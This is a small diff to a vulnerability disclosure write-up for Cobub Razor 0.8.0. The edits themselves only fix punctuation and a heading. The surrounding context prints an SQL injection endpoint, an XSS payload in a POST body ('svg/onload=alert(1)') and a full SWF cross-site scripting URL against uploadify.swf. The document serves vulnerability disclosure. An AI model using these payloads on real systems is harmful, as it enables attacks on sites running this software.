@@ -75,7 +75,8 @@ SQLmap results:
 ![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_sql_4.png)
 
 ## Update Content ##
-New discovery：
+New discovery:  
+
 1.SQL injection  
 
 (1)http://localhost/index.php?/manage/channel/addsychannel  
@@ -117,7 +118,8 @@ Content-Length: 65
 channel_id=1212%22&channel_name=xss><svg/onload=alert(1)>&platform=1
 ```  
 
-2.SWF xss  
+2.SWF Cross Site Scripting  
+
 http://localhost/assets/swf/uploadify.swf?uploadifyID=00"));}catch(e){alert(1);}//("&movieName="])}catch(e){if(!window.x){window.x=1;alert(2)}}//&.swf  
 
 
